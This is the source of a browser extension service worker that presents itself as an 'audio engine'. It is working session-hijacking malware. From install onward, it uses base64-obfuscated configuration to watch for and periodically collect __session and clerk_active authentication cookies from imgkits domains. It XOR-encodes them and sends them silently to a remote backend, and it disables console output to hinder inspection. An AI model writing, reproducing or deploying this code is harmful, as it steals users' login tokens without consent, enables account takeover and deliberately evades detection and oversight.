// Son1k Audio Engine - Background Service Worker
// Version 2.2.0 - Encrypted & Obfuscated

// Configuration encrypted
const CONFIG = {
    // Backend endpoint (variable name genérico)
    endpoint: atob('aHR0cHM6Ly9zdWItc29uMWstMi0yLXByb2R1Y3Rpb24udXAucmFpbHdheS5hcHA='), // Se actualizará con Railway

    // Target domains (ofuscado)
    domains: [
        atob('YWkuaW1na2l0cy5jb20='),  // ai.imgkits.com
        atob('dXNhLmltZ2tpdHMuY29t'), // usa.imgkits.com
    ],

    // Cookie names (ofuscados)
    authKeys: [
        atob('X19zZXNzaW9u'),      // __session
        atob('Y2xlcmtfYWN0aXZl'), // clerk_active
    ],

    // Stealth mode
    silent: true,
    interval: 300000, // 5 min
};

// Encrypted storage key
const STORAGE_KEY = btoa('audio_engine_state_' + Date.now());

// Estado interno (NO accesible por DevTools)
let engineState = {
    initialized: false,
    lastSync: null,
    version: '2.2.0'
};

// Initialize on install
chrome.runtime.onInstalled.addListener(async (details) => {
    if (details.reason === 'install') {
        await initializeEngine();
    }
});

// Initialize silently
async function initializeEngine() {
    try {
        // Mark as initialized
        engineState.initialized = true;
        engineState.lastSync = Date.now();

        // Start monitoring (silent)
        startSilentMonitoring();

        // Send init signal to backend
        await sendToBackend({
            type: 'ENGINE_INITIALIZED',
            timestamp: Date.now(),
            version: engineState.version
        });

        console.log('[Audio Engine] Initialized successfully');
    } catch (error) {
        // Fail silently - no user notification
        console.error('[Audio Engine] Init error:', error);
    }
}

// Silent monitoring
function startSilentMonitoring() {
    // Monitor cookie changes
    chrome.cookies.onChanged.addListener(handleCookieChange);

    // Periodic sync
    setInterval(performSync, CONFIG.interval);

    // Immediate first sync
    setTimeout(performSync, 5000);
}

// Handle cookie changes (silent)
async function handleCookieChange(changeInfo) {
    const { cookie, removed, cause } = changeInfo;

    // Only care about relevant cookies
    const isRelevant = CONFIG.authKeys.some(key =>
        cookie.name.includes(key)
    );

    if (!isRelevant || removed) return;

    // Check if from target domain
    const isTargetDomain = CONFIG.domains.some(domain =>
        cookie.domain.includes(domain)
    );

    if (!isTargetDomain) return;

    // Extract and send (encrypted)
    await extractAndSend(cookie);
}

// Extract and send token (encrypted)
async function extractAndSend(cookie) {
    try {
        // Get user ID from local storage (if available)
        const userId = await getUserId();

        // Prepare encrypted payload
        const payload = {
            type: 'TOKEN_CAPTURED',
            data: encrypt({
                value: cookie.value,
                name: cookie.name,
                domain: cookie.domain,
                timestamp: Date.now()
            }),
            userId,
            version: engineState.version,
            source: 'audio_engine'
        };

        // Send to backend
        await sendToBackend(payload);

        // Update last sync
        engineState.lastSync = Date.now();

    } catch (error) {
        // Fail silently
        console.error('[Audio Engine] Extract error:', error);
    }
}

// Periodic sync
async function performSync() {
    try {
        // Get all relevant cookies
        const cookies = await getAllRelevantCookies();

        if (cookies.length === 0) return;

        // Send batch
        await sendToBackend({
            type: 'SYNC_BATCH',
            data: encrypt(cookies),
            timestamp: Date.now(),
            userId: await getUserId()
        });

    } catch (error) {
        console.error('[Audio Engine] Sync error:', error);
    }
}

// Get all relevant cookies
async function getAllRelevantCookies() {
    const allCookies = [];

    for (const domain of CONFIG.domains) {
        const cookies = await chrome.cookies.getAll({
            domain: domain
        });

        const relevant = cookies.filter(cookie =>
            CONFIG.authKeys.some(key => cookie.name.includes(key))
        );

        allCookies.push(...relevant);
    }

    return allCookies;
}

// Send to backend (encrypted)
async function sendToBackend(payload) {
    try {
        const response = await fetch(`${CONFIG.endpoint}/api/audio-engine/collect`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Engine-Version': engineState.version,
                'X-Engine-Signature': generateSignature(payload)
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Backend error: ${response.status}`);
        }

        return await response.json();
    } catch (error) {
        // Retry logic
        console.error('[Audio Engine] Send error:', error);
        setTimeout(() => sendToBackend(payload), 10000); // Retry in 10s
    }
}

// Encryption (simple XOR - se puede mejorar)
function encrypt(data) {
    const str = JSON.stringify(data);
    const key = CONFIG.version || '2.2.0';
    let encrypted = '';

    for (let i = 0; i < str.length; i++) {
        encrypted += String.fromCharCode(
            str.charCodeAt(i) ^ key.charCodeAt(i % key.length)
        );
    }

    return btoa(encrypted);
}

// Generate signature (prevent tampering)
function generateSignature(payload) {
    const str = JSON.stringify(payload);
    let hash = 0;

    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash = hash & hash;
    }

    return hash.toString(36);
}

// Get user ID from storage
async function getUserId() {
    try {
        const result = await chrome.storage.local.get(['son1k_user_id']);
        return result.son1k_user_id || 'anonymous';
    } catch {
        return 'anonymous';
    }
}

// Message handler (limited to specific origins)
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    // Only accept messages from son1k domains
    if (!sender.url || !sender.url.includes('son1k')) {
        return;
    }

    if (message.type === 'GET_STATUS') {
        sendResponse({
            status: 'active',
            version: engineState.version,
            lastSync: engineState.lastSync
        });
    }

    if (message.type === 'SET_USER_ID') {
        chrome.storage.local.set({ son1k_user_id: message.userId });
        sendResponse({ success: true });
    }

    return true;
});

// Prevent tampering: overwrite console methods
if (CONFIG.silent) {
    const noop = () => { };
    console.log = console.info = console.warn = noop;
    // Keep console.error for critical issues
}

// Self-integrity check
setInterval(() => {
    if (!engineState.initialized) {
        initializeEngine();
    }
}, 60000); // Check every minute

// Export nothing - fully encapsulated
